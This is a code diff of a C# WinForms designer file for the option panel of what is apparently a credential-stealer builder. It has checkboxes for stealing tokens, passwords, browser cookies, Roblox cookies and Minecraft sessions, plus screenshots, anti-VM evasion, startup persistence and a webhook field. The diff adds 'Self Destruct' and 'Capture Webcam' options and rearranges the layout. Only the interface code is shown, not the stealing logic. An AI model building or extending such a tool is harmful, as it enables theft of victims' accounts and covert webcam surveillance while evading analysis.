@@ -31,7 +31,7 @@
             this.webhookLabel = new System.Windows.Forms.TextBox();
             this.WebhookCheckButton = new System.Windows.Forms.Button();
             this.PingCheckBox = new System.Windows.Forms.CheckBox();
-            this.VmProtectCheckBox = new System.Windows.Forms.CheckBox();
+            this.AntiVmCheckBox = new System.Windows.Forms.CheckBox();
             this.StartupCheckBox = new System.Windows.Forms.CheckBox();
             this.StealTokensCheckBox = new System.Windows.Forms.CheckBox();
             this.StealPasswordsCheckBox = new System.Windows.Forms.CheckBox();
@@ -40,6 +40,8 @@
             this.StealMinecraftSessionCheckBox = new System.Windows.Forms.CheckBox();
             this.label1 = new System.Windows.Forms.Label();
             this.TakeScreenshotCheckBox = new System.Windows.Forms.CheckBox();
+            this.SelfDestructCheckBox = new System.Windows.Forms.CheckBox();
+            this.CaptureWebcamCheckBox = new System.Windows.Forms.CheckBox();
             this.SuspendLayout();
             // 
             // webhookLabel
@@ -87,25 +89,25 @@
             this.PingCheckBox.UseVisualStyleBackColor = true;
             this.PingCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
             // 
-            // VmProtectCheckBox
+            // AntiVmCheckBox
             // 
-            this.VmProtectCheckBox.AutoSize = true;
-            this.VmProtectCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.VmProtectCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.VmProtectCheckBox.Location = new System.Drawing.Point(24, 291);
-            this.VmProtectCheckBox.Name = "VmProtectCheckBox";
-            this.VmProtectCheckBox.Size = new System.Drawing.Size(77, 22);
-            this.VmProtectCheckBox.TabIndex = 3;
-            this.VmProtectCheckBox.Text = "Anti VM";
-            this.VmProtectCheckBox.UseVisualStyleBackColor = true;
-            this.VmProtectCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
+            this.AntiVmCheckBox.AutoSize = true;
+            this.AntiVmCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.AntiVmCheckBox.ForeColor = System.Drawing.SystemColors.Control;
+            this.AntiVmCheckBox.Location = new System.Drawing.Point(24, 262);
+            this.AntiVmCheckBox.Name = "AntiVmCheckBox";
+            this.AntiVmCheckBox.Size = new System.Drawing.Size(77, 22);
+            this.AntiVmCheckBox.TabIndex = 3;
+            this.AntiVmCheckBox.Text = "Anti VM";
+            this.AntiVmCheckBox.UseVisualStyleBackColor = true;
+            this.AntiVmCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
             // 
             // StartupCheckBox
             // 
             this.StartupCheckBox.AutoSize = true;
             this.StartupCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StartupCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StartupCheckBox.Location = new System.Drawing.Point(24, 359);
+            this.StartupCheckBox.Location = new System.Drawing.Point(24, 301);
             this.StartupCheckBox.Name = "StartupCheckBox";
             this.StartupCheckBox.Size = new System.Drawing.Size(74, 22);
             this.StartupCheckBox.TabIndex = 4;
@@ -118,7 +120,7 @@
             this.StealTokensCheckBox.AutoSize = true;
             this.StealTokensCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StealTokensCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StealTokensCheckBox.Location = new System.Drawing.Point(140, 223);
+            this.StealTokensCheckBox.Location = new System.Drawing.Point(201, 200);
             this.StealTokensCheckBox.Name = "StealTokensCheckBox";
             this.StealTokensCheckBox.Size = new System.Drawing.Size(114, 22);
             this.StealTokensCheckBox.TabIndex = 5;
@@ -131,7 +133,7 @@
             this.StealPasswordsCheckBox.AutoSize = true;
             this.StealPasswordsCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StealPasswordsCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StealPasswordsCheckBox.Location = new System.Drawing.Point(140, 291);
+            this.StealPasswordsCheckBox.Location = new System.Drawing.Point(201, 228);
             this.StealPasswordsCheckBox.Name = "StealPasswordsCheckBox";
             this.StealPasswordsCheckBox.Size = new System.Drawing.Size(139, 22);
             this.StealPasswordsCheckBox.TabIndex = 6;
@@ -144,7 +146,7 @@
             this.StealCookiesCheckBox.AutoSize = true;
             this.StealCookiesCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StealCookiesCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StealCookiesCheckBox.Location = new System.Drawing.Point(140, 359);
+            this.StealCookiesCheckBox.Location = new System.Drawing.Point(201, 256);
             this.StealCookiesCheckBox.Name = "StealCookiesCheckBox";
             this.StealCookiesCheckBox.Size = new System.Drawing.Size(120, 22);
             this.StealCookiesCheckBox.TabIndex = 7;
@@ -157,7 +159,7 @@
             this.StealRobloxCookiesCheckBox.AutoSize = true;
             this.StealRobloxCookiesCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StealRobloxCookiesCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StealRobloxCookiesCheckBox.Location = new System.Drawing.Point(307, 223);
+            this.StealRobloxCookiesCheckBox.Location = new System.Drawing.Point(201, 284);
             this.StealRobloxCookiesCheckBox.Name = "StealRobloxCookiesCheckBox";
             this.StealRobloxCookiesCheckBox.Size = new System.Drawing.Size(171, 22);
             this.StealRobloxCookiesCheckBox.TabIndex = 8;
@@ -170,7 +172,7 @@
             this.StealMinecraftSessionCheckBox.AutoSize = true;
             this.StealMinecraftSessionCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.StealMinecraftSessionCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.StealMinecraftSessionCheckBox.Location = new System.Drawing.Point(307, 291);
+            this.StealMinecraftSessionCheckBox.Location = new System.Drawing.Point(201, 312);
             this.StealMinecraftSessionCheckBox.Name = "StealMinecraftSessionCheckBox";
             this.StealMinecraftSessionCheckBox.Size = new System.Drawing.Size(183, 22);
             this.StealMinecraftSessionCheckBox.TabIndex = 9;
@@ -183,7 +185,7 @@
             this.label1.BackColor = System.Drawing.Color.White;
             this.label1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.label1.ForeColor = System.Drawing.SystemColors.Control;
-            this.label1.Location = new System.Drawing.Point(107, 188);
+            this.label1.Location = new System.Drawing.Point(162, 180);
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(1, 225);
             this.label1.TabIndex = 10;
@@ -193,7 +195,7 @@
             this.TakeScreenshotCheckBox.AutoSize = true;
             this.TakeScreenshotCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.TakeScreenshotCheckBox.ForeColor = System.Drawing.SystemColors.Control;
-            this.TakeScreenshotCheckBox.Location = new System.Drawing.Point(307, 359);
+            this.TakeScreenshotCheckBox.Location = new System.Drawing.Point(201, 340);
             this.TakeScreenshotCheckBox.Name = "TakeScreenshotCheckBox";
             this.TakeScreenshotCheckBox.Size = new System.Drawing.Size(140, 22);
             this.TakeScreenshotCheckBox.TabIndex = 11;
@@ -201,11 +203,39 @@
             this.TakeScreenshotCheckBox.UseVisualStyleBackColor = true;
             this.TakeScreenshotCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
             // 
+            // SelfDestructCheckBox
+            // 
+            this.SelfDestructCheckBox.AutoSize = true;
+            this.SelfDestructCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.SelfDestructCheckBox.ForeColor = System.Drawing.SystemColors.Control;
+            this.SelfDestructCheckBox.Location = new System.Drawing.Point(24, 340);
+            this.SelfDestructCheckBox.Name = "SelfDestructCheckBox";
+            this.SelfDestructCheckBox.Size = new System.Drawing.Size(112, 22);
+            this.SelfDestructCheckBox.TabIndex = 12;
+            this.SelfDestructCheckBox.Text = "Self Destruct";
+            this.SelfDestructCheckBox.UseVisualStyleBackColor = true;
+            this.SelfDestructCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
+            // 
+            // CaptureWebcamCheckBox
+            // 
+            this.CaptureWebcamCheckBox.AutoSize = true;
+            this.CaptureWebcamCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.CaptureWebcamCheckBox.ForeColor = System.Drawing.SystemColors.Control;
+            this.CaptureWebcamCheckBox.Location = new System.Drawing.Point(201, 368);
+            this.CaptureWebcamCheckBox.Name = "CaptureWebcamCheckBox";
+            this.CaptureWebcamCheckBox.Size = new System.Drawing.Size(143, 22);
+            this.CaptureWebcamCheckBox.TabIndex = 13;
+            this.CaptureWebcamCheckBox.Text = "Capture Webcam";
+            this.CaptureWebcamCheckBox.UseVisualStyleBackColor = true;
+            this.CaptureWebcamCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
+            // 
             // GeneralTab
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(31)))), ((int)(((byte)(31)))), ((int)(((byte)(31)))));
+            this.Controls.Add(this.CaptureWebcamCheckBox);
+            this.Controls.Add(this.SelfDestructCheckBox);
             this.Controls.Add(this.TakeScreenshotCheckBox);
             this.Controls.Add(this.label1);
             this.Controls.Add(this.StealMinecraftSessionCheckBox);
@@ -214,7 +244,7 @@
             this.Controls.Add(this.StealPasswordsCheckBox);
             this.Controls.Add(this.StealTokensCheckBox);
             this.Controls.Add(this.StartupCheckBox);
-            this.Controls.Add(this.VmProtectCheckBox);
+            this.Controls.Add(this.AntiVmCheckBox);
             this.Controls.Add(this.PingCheckBox);
             this.Controls.Add(this.WebhookCheckButton);
             this.Controls.Add(this.webhookLabel);
@@ -231,7 +261,7 @@
 
         private System.Windows.Forms.TextBox webhookLabel;
         private System.Windows.Forms.Button WebhookCheckButton;
-        private System.Windows.Forms.CheckBox VmProtectCheckBox;
+        private System.Windows.Forms.CheckBox AntiVmCheckBox;
         private System.Windows.Forms.CheckBox StartupCheckBox;
         private System.Windows.Forms.CheckBox StealTokensCheckBox;
         private System.Windows.Forms.CheckBox StealPasswordsCheckBox;
@@ -241,5 +271,7 @@
         private System.Windows.Forms.CheckBox PingCheckBox;
         private System.Windows.Forms.Label label1;
         private System.Windows.Forms.CheckBox TakeScreenshotCheckBox;
+        private System.Windows.Forms.CheckBox SelfDestructCheckBox;
+        private System.Windows.Forms.CheckBox CaptureWebcamCheckBox;
     }
 }
